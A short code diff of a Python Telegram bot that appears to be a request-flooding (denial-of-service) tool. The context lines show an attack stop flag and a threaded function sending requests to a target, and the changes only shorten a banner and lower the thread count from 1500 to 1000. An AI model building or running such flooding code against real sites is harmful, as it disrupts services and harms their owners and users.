@@ -19,7 +19,7 @@ bot = telebot.TeleBot(TOKEN)
 stop_attack_flag = multiprocessing.Value('b', False)
 
 def display_banner(chat_id):
-    banner_text = "JUNAI"
+    banner_text = "j"
     for char in banner_text:
         bot.send_message(chat_id, Fore.GREEN + char + Style.RESET_ALL)
         time.sleep(0.0)
@@ -46,7 +46,7 @@ def send_requests_threaded(target, stop_flag):
             except requests.exceptions.RequestException:
                 pass
 
-    num_threads = 1500  # استخدام 1500 خيط كحد أقصى
+    num_threads = 1000  # استخدام 1000 خيط كحد أقصى
 
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(num_threads)]
